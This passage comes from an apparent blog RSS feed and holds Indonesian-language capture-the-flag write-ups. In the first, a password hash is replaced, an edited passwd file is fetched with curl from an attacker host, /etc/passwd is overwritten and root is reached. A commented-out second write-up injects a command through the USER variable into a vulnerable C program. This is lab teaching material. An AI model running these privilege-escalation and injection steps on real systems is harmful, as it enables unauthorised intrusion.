<span class="n">syslog</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">104</span><span class="p">:</span><span class="mi">108</span><span class="p">::</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">syslog</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="no">false</span>
<span class="n">_apt</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">105</span><span class="p">:</span><span class="mi">65534</span><span class="p">::</span><span class="o">/</span><span class="n">nonexistent</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="no">false</span>
<span class="n">lxd</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">106</span><span class="p">:</span><span class="mi">65534</span><span class="p">::</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">lxd</span><span class="o">/</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="no">false</span>
<span class="n">mysql</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">107</span><span class="p">:</span><span class="mi">111</span><span class="p">:</span><span class="n">MySQL</span> <span class="n">Server</span><span class="p">,,,:</span><span class="o">/</span><span class="n">nonexistent</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="no">false</span>
<span class="n">messagebus</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">108</span><span class="p">:</span><span class="mi">112</span><span class="p">::</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">dbus</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="no">false</span>
<span class="n">uuidd</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">109</span><span class="p">:</span><span class="mi">113</span><span class="p">::</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">uuidd</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="no">false</span>
<span class="n">dnsmasq</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">110</span><span class="p">:</span><span class="mi">65534</span><span class="p">:</span><span class="n">dnsmasq</span><span class="p">,,,:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">misc</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="no">false</span>
<span class="n">sshd</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">111</span><span class="p">:</span><span class="mi">65534</span><span class="p">::</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">sshd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">taviso</span><span class="p">:</span><span class="err">$</span><span class="mi">1</span><span class="err">$</span><span class="n">FhytX</span><span class="p">.</span><span class="n">J</span><span class="o">/</span><span class="err">$</span><span class="n">cb</span><span class="o">/</span><span class="n">k7Fmg4LlTu9f8XDgux1</span><span class="p">:</span><span class="mi">1000</span><span class="p">:</span><span class="mi">1000</span><span class="p">:</span><span class="n">Taviso</span><span class="p">,,,:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">taviso</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span></code></pre></figure>

<p>Saya memilih user <code>taviso</code> karena user tersebut berada didalam grup <code>sudo</code></p>

<figure class="highlight"><pre><code class="language-mysql" data-lang="mysql"><span></span><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="o">@</span><span class="n">hackday</span><span class="p">:</span><span class="o">/</span><span class="n">tmp</span><span class="err">$</span> <span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="k">group</span> <span class="o">|</span> <span class="n">grep</span> <span class="n">sudo</span>
<span class="n">sudo</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="n">taviso</span></code></pre></figure>

<p>Saya memindahkan file passwd yang sudah saya ganti password nya ke <em>Document Root</em> apache2 sehingga bisa ditranser ke system hackday, sebenar nya untuk mentransfer file bisa juga menggunakan <code>nc</code> tetapi saya menggunakan <code>curl</code> untuk mentransfer file passwd tersebut.</p>

<figure class="highlight"><pre><code class="language-mysql" data-lang="mysql"><span></span><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="o">@</span><span class="n">hackday</span><span class="p">:</span><span class="o">/</span><span class="n">tmp</span><span class="err">$</span> <span class="n">curl</span> <span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">1</span><span class="o">/</span><span class="n">passwd</span> <span class="o">-</span><span class="n">O</span>               
<span class="n">curl</span> <span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">1</span><span class="o">/</span><span class="n">passwd</span> <span class="o">-</span><span class="n">O</span>
  <span class="o">%</span> <span class="n">Total</span>    <span class="o">%</span> <span class="n">Received</span> <span class="o">%</span> <span class="n">Xferd</span>  <span class="n">Average</span> <span class="n">Speed</span>   <span class="kt">Time</span>    <span class="kt">Time</span>     <span class="kt">Time</span>  <span class="n">Current</span>
                                 <span class="n">Dload</span>  <span class="n">Upload</span>   <span class="n">Total</span>   <span class="n">Spent</span>    <span class="k">Left</span>  <span class="n">Speed</span>
<span class="mi">100</span>  <span class="mi">1657</span>  <span class="mi">100</span>  <span class="mi">1657</span>    <span class="mi">0</span>     <span class="mi">0</span>   <span class="mi">148</span><span class="n">k</span>      <span class="mi">0</span> <span class="o">--</span><span class="p">:</span><span class="o">--</span><span class="p">:</span><span class="c1">-- --:--:-- --:--:--  179k</span></code></pre></figure>

<p>Setelah itu mari kita timpa file <code>/etc/passwd</code> dengan file <code>passwd</code> yang sudah kita edit.</p>

<figure class="highlight"><pre><code class="language-mysql" data-lang="mysql"><span></span><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="o">@</span><span class="n">hackday</span><span class="p">:</span><span class="o">/</span><span class="n">tmp</span><span class="err">$</span> <span class="n">cp</span> <span class="n">passwd</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span>
<span class="n">cp</span> <span class="n">passwd</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span>
<span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="o">@</span><span class="n">hackday</span><span class="p">:</span><span class="o">/</span><span class="n">tmp</span><span class="err">$</span> <span class="n">su</span> <span class="n">taviso</span>
<span class="n">su</span> <span class="n">taviso</span>
<span class="n">Password</span><span class="p">:</span> <span class="n">passw0rd</span>

<span class="n">taviso</span><span class="o">@</span><span class="n">hackday</span><span class="p">:</span><span class="o">/</span><span class="n">tmp</span><span class="err">$</span> <span class="n">sudo</span> <span class="o">-</span><span class="n">l</span>
<span class="n">sudo</span> <span class="o">-</span><span class="n">l</span>
<span class="p">[</span><span class="n">sudo</span><span class="p">]</span> <span class="n">password</span> <span class="k">for</span> <span class="n">taviso</span><span class="p">:</span> <span class="n">passw0rd</span>

<span class="n">Matching</span> <span class="n">Defaults</span> <span class="n">entries</span> <span class="k">for</span> <span class="n">taviso</span> <span class="k">on</span> <span class="n">hackday</span><span class="p">:</span>
    <span class="n">env_reset</span><span class="p">,</span> <span class="n">mail_badpass</span><span class="p">,</span>
    <span class="n">secure_path</span><span class="o">=/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">sbin</span><span class="err">\</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">bin</span><span class="err">\</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="err">\</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="err">\</span><span class="p">:</span><span class="o">/</span><span class="n">sbin</span><span class="err">\</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="err">\</span><span class="p">:</span><span class="o">/</span><span class="n">snap</span><span class="o">/</span><span class="n">bin</span>

<span class="n">User</span> <span class="n">taviso</span> <span class="n">may</span> <span class="n">run</span> <span class="n">the</span> <span class="n">following</span> <span class="n">commands</span> <span class="k">on</span> <span class="n">hackday</span><span class="p">:</span>
    <span class="p">(</span><span class="k">ALL</span> <span class="p">:</span> <span class="k">ALL</span><span class="p">)</span> <span class="k">ALL</span>


<span class="n">Voila</span> <span class="o">!</span> <span class="n">Access</span> <span class="n">Granted</span></code></pre></figure>

<h2 id="get-the-flag">8. Get The Flag</h2>

<figure class="highlight"><pre><code class="language-mysql" data-lang="mysql"><span></span><span class="n">taviso</span><span class="o">@</span><span class="n">hackday</span><span class="p">:</span><span class="o">/</span><span class="n">tmp</span><span class="err">$</span> <span class="n">sudo</span> <span class="n">su</span> 
<span class="n">root</span><span class="o">@</span><span class="n">hackday</span><span class="p">:</span><span class="o">/</span><span class="n">tmp</span><span class="c1"># cd /root</span>
<span class="n">root</span><span class="o">@</span><span class="n">hackday</span><span class="p">:</span><span class="o">~</span><span class="c1"># ls</span>
<span class="n">ls</span>
<span class="n">flag</span><span class="p">.</span><span class="n">txt</span>
<span class="n">root</span><span class="o">@</span><span class="n">hackday</span><span class="p">:</span><span class="o">~</span><span class="c1"># cat flag.txt</span>
<span class="n">cat</span> <span class="n">flag</span><span class="p">.</span><span class="n">txt</span>
<span class="n">Urime</span><span class="p">,</span> 
<span class="n">Tani</span> <span class="n">nis</span> <span class="n">raportin</span><span class="o">!</span>

<span class="n">d5ed38fdbf28bc4e58be142cf5a17cf5</span></code></pre></figure>

<p>Didapatkan flag untuk Chellenge ini : d5ed38fdbf28bc4e58be142cf5a17cf5</p>

<!-- Executive Summary
====================================
Challenge level02 exploit-exercise adalah mengganti value Environtment variable $USER sehingga dapat memanipulasi cara kerja program

# About

There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?
To do this level, log in as the level02 account with the password level02. Files for this level can be found in /home/flag02.

Source code
====================================

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span><span class="c1">#include &lt;stdlib.h&gt;</span>
<span class="c1">#include &lt;unistd.h&gt;</span>
<span class="c1">#include &lt;string.h&gt;</span>
<span class="c1">#include &lt;sys/types.h&gt;</span>
<span class="c1">#include &lt;stdio.h&gt;</span>

int main<span class="o">(</span>int argc, char **argv, char **envp<span class="o">)</span>
<span class="o">{</span>
  char *buffer<span class="p">;</span>

  gid_t gid<span class="p">;</span>
  uid_t uid<span class="p">;</span>

  <span class="nv">gid</span> <span class="o">=</span> getegid<span class="o">()</span><span class="p">;</span>
  <span class="nv">uid</span> <span class="o">=</span> geteuid<span class="o">()</span><span class="p">;</span>

  setresgid<span class="o">(</span>gid, gid, gid<span class="o">)</span><span class="p">;</span>
  setresuid<span class="o">(</span>uid, uid, uid<span class="o">)</span><span class="p">;</span>

  <span class="nv">buffer</span> <span class="o">=</span> NULL<span class="p">;</span>

  asprintf<span class="o">(</span><span class="p">&amp;</span>buffer, <span class="s2">&quot;/bin/echo %s is cool&quot;</span>, getenv<span class="o">(</span><span class="s2">&quot;USER&quot;</span><span class="o">))</span><span class="p">;</span>
  printf<span class="o">(</span><span class="s2">&quot;about to call system(\&quot;%s\&quot;)\n&quot;</span>, buffer<span class="o">)</span><span class="p">;</span>
  
  system<span class="o">(</span>buffer<span class="o">)</span><span class="p">;</span>
<span class="o">}</span></code></pre></figure>


Proof Of Concept
====================================
Pada source code .c diatas terdapat fungsi asprintf untuk melakukan _Concatenating strings_ dengan mengambil value dari $USER yang dipanggil oleh fungsi getenv()

Untuk menyelesaikan challenge ini, kita dapat mengganti value dari $USER sehingga dapat menjalankan command yang kita inginkan.



<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>sh-4.2$ <span class="nv">USER</span><span class="o">=</span><span class="s2">&quot;AAA;getflag&quot;</span>
sh-4.2$ ./flag02
about to call system<span class="o">(</span><span class="s2">&quot;/bin/echo AAA;getflag is cool&quot;</span><span class="o">)</span>
AAA
You have successfully executed getflag on a target account</code></pre></figure>

 -->

	  ]]></description>
	</item>


</channel>
</rss>
